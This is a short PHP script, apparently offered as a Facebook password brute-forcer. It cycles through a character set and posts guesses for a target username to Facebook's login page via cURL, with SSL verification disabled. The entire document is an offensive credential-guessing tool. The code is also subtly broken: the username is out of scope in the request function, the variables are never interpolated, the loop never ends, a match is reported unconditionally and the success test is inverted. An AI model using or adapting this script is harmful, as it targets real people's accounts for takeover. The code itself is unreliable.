<?php

global $wrong;
global $startpagina;
$time = microtime() * 100000;
$username = $_SERVER["argv"][1];
echo "https://twitter.com/LizardL4nds";
$Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
$c_len = strlen($Pass); 
$min = 1;
$max = 12;
if ($_SERVER["argc"] < 1) {
  print "Usage: brutefb.php <username>\n";
  exit;
}
function bruteForce($min, $max, $Pass)
{
while(True)
{     
		
	for ($i = $min; $min < $max; $i++) 
	{        
		if ($min < $max - 1) 
		{    
			bruteForce($min, $max + 1, $Pass[$i]); 	
			echo '<br/><br/>'.'FOUND MATCH, password: '.$Pass[$i]."\r\n";
		}
		check_correct($Pass[$i]);  
        }
}
} 
function check_correct($Pass)
{
	$c = curl_init('https://www.facebook.com/login');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$Pass.'");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 1); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c); 
	if($str != "What is on your mind?") {return true;}
        else {return false;}
}
bruteForce($min, $max, $Pass);
echo "NO PASSWORD FOUND"; 
?>
